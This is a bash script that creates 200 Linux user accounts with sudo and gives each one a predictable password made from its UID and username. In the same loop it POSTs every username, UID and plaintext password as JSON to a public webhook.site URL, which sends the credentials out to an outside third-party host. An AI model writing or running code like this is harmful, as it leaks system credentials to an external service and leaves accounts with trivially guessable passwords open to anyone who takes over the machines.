#!/bin/bash

for i in {1..200}
do
  uid=$((1500 + i))
  username="user${i}"
  password="${uid}+${username}"

  sudo useradd -m -u ${uid} -s /bin/bash ${username}
  echo -e "${password}\n${password}" | sudo passwd ${username}
  json_data="{ \"username\": \"$username\", \"uid\": $uid, \"password\": \"$password\" }"

  # Sending all user to webhook.site
  curl -X POST -H "Content-Type: application/json" -d "$json_data" https://webhook.site/b8b02b71-fea0-4fc2-b189-058261b6032b
done
